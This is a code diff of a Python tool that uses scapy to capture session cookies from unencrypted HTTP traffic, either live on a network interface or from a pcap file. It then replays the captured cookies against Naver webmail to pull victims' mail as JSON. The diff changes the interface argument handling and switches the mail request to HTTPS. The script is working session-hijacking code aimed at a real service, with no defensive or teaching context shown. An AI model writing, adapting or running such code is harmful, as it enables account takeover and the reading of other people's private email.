@@ -63,7 +63,7 @@ def mail_json_sniff(COOKIE_HASH_TABLE):
 
     # sys.exit()
     # print(cookie_header)
-    requer = requests.get("http://mail.naver.com", cookies=COOKIE_HASH_TABLE)
+    requer = requests.get("https://mail.naver.com", cookies=COOKIE_HASH_TABLE)
 
     response = requer.content
     json_mail = {}
@@ -116,26 +116,26 @@ def mail_json_sniff(COOKIE_HASH_TABLE):
 
 if __name__ == '__main__':
     if len(sys.argv) != 2:
-        if sys.argv[1] not in ["live", "pcap"]:
-            print("Input Condition 'live' or 'pcap'")
-            print("USAGE : %s Condition - live or pcap" % sys.argv[0])
-            sys.exit()
+        print("Input Condition 'interface' or 'pcap'")
+        print("USAGE : %s Condition - interface or pcap" % sys.argv[0])
+        sys.exit()
+    
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(('8.8.8.8', 0))
     ip = s.getsockname()[0]
     print(ip)
 
-    if sys.argv[1] == "live":
-        # sniff(iface="wlan0", prn=cookie_sniff, filter="tcp port 80 and src host not " + ip)
-        sniff(iface="wlan0", prn=cookie_sniff, filter="tcp port 80")
-    elif sys.argv[1] == "pcap":
+    if sys.argv[1] == "pcap":
         filename = input("Input File Name : ")
         now_path = os.path.dirname(os.path.abspath(__file__))
         pcap_path = os.path.join(now_path, filename)
         pcap = rdpcap(pcap_path)
         for packet in pcap:
             cookie_sniff(packet)
-
+    else:
+        # sniff(iface="wlan0", prn=cookie_sniff, filter="tcp port 80 and src host not " + ip)
+        sniff(iface=sys.argv[1], prn=cookie_sniff, filter="tcp port 80")
+    
 
         # sniff(iface = interface, prn = cookie_sniff ,filter = "tcp port 80 and src host not "+ip)
 
